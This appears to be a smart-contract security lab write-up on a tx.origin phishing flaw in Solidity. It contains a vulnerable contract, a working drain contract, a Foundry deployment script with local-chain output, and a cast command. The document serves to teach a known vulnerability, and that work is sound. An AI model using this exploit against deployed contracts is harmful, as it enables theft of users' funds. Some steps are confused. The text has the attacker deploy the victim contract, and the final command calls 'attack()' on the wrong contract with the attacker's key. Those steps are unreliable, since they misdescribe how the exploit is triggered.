# Web3eg-Smart-Contract-Auditor-Phishing-Attack
- The contract you've provided has a security vulnerability related to the use of tx.origin for authorization.
 This vulnerability can be exploited by an attacker to trick the owner into executing a malicious transaction. 
Below is an explanation of the vulnerability and how it can be exploited.

```solidity  
  
 //SPDX-Liecence-Identifier: MIT
 pragma solidity ^0.8.26;

contract Phishing {
    address public owner;
    constructor() payable {
        owner = msg.sender;
    }

    function transfer (address payable _to , uint _amount) public {
        require (tx.origin == owner , " you are not the owner");
        (bool sent , ) = _to.call{value: _amount}("");
        require(sent ,"fail");
    }
    }
    
```


- Exploitation Scenario
1- Deploy the Phishing Contract: The attacker deploys the Phishing contract and funds it with some Ether.

2- Create a Malicious Contract: The attacker creates a malicious contract that calls the transfer function of the Phishing contract.

3- Trick the Owner: The attacker tricks the owner into interacting with the malicious contract. This could be done through social engineering, such as sending a phishing email or link that appears to be legitimate.

4- Execute the Attack: When the owner interacts with the malicious contract, it calls the transfer function of the Phishing contract. Since tx.origin is the owner's address, the require statement passes, and the funds are transferred to the attacker's address.


```solidity
//SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;
    interface IPhishing{
        function transfer(address payable _to, uint _amount) external;
    }

    contract PhishingAttack {
        address public attacker;
        IPhishing public phishing;
        constructor (address _phishing) payable{
            attacker = payable(msg.sender);
            phishing = IPhishing((_phishing));
        }

        function attack() public{

        phishing.transfer(payable(attacker), address(phishing).balance);
        }
        receive() external payable {}

    }

```

- Deploy the Phishing Contract: Deploy the Phishing contract and fund it with Ether. and PhishingAttack contract
  
```solidity
//SPDX-Liecence-Identifier: MIT
pragma solidity ^0.8.26;
import "forge-std/Script.sol";
import "src/Phishing.sol";
import "src/PhishingAttack.sol";

contract DeployPhishing is Script{

    function run() external {

        uint256 privateKey1 =vm.envUint ("PRIVATE_KEY1");
        uint256 privateKey2 = vm.envUint("PRIVATE_KEY2");

        vm.startBroadcast(privateKey1);
        Phishing phishing = new Phishing{value : 10 ether}();
        vm.stopBroadcast();

        vm.startBroadcast(privateKey2);
        PhishingAttack phishingAttack = new PhishingAttack(address(phishing));
        vm.stopBroadcast();
    }

}
```

OUTPUT
```
Script ran successfully.

## Setting up 1 EVM.

==========================

Chain 31337

Estimated gas price: 2.000000001 gwei

Estimated total gas used for script: 449553

Estimated amount required: 0.000899106000449553 ETH

==========================

##### anvil-hardhat
✅  [Success] Hash: 0xabd7c801f907b4775ebbbbdf3330042efe9153c2ab6cb79f2f05b322afcaf928
Contract Address: 0x5FbDB2315678afecb367f032d93F642f64180aa3
Block: 1
Paid: 0.000174585000174585 ETH (174585 gas * 1.000000001 gwei)


##### anvil-hardhat
✅  [Success] Hash: 0x8a773e65109e878f280032ae1275ca1b584f590e68d92f0afa2e73676cb305df
Contract Address: 0x8464135c8F25Da09e49BC8782676a84730C318bC
Block: 2
Paid: 0.000150071862597976 ETH (171226 gas * 0.876454876 gwei)

✅ Sequence #1 on anvil-hardhat | Total Paid: 0.000324656862772561 ETH (345811 gas * avg 0.938227438 gwei)
                                                                                                                                                                              

==========================

ONCHAIN EXECUTION COMPLETE & SUCCESSFUL.

Transactions saved to: /home/mourad/web3eg security/arithmatic/broadcast/DeployPhishing.s.sol/31337/run-latest.json

Sensitive values saved to: /home/mourad/web3eg security/arithmatic/cache/DeployPhishing.s.sol/31337/run-latest.json
```

- command to deploy ``` forge script script/DeployPhishing.s.sol:DeployPhishing --rpc-url http://127.0.0.1:8545 --broadcast```
-  Trick the Owner: The attacker tricks the owner into interacting with the malicious contract.
 This could be done through social engineering, such as sending a phishing email or link that appears to be legitimate.

- Execute the Attack: When the owner interacts with the malicious contract, it calls the transfer function of the Phishing contract. 
Since tx.origin is the owner's address, the require statement passes, and the funds are transferred to the attacker's address.

  
```
cast send < Phishing contract address> "attack()" --rpc-url http://127.0.0.1:8545 --private-key <private key PhishingAttack> 
```
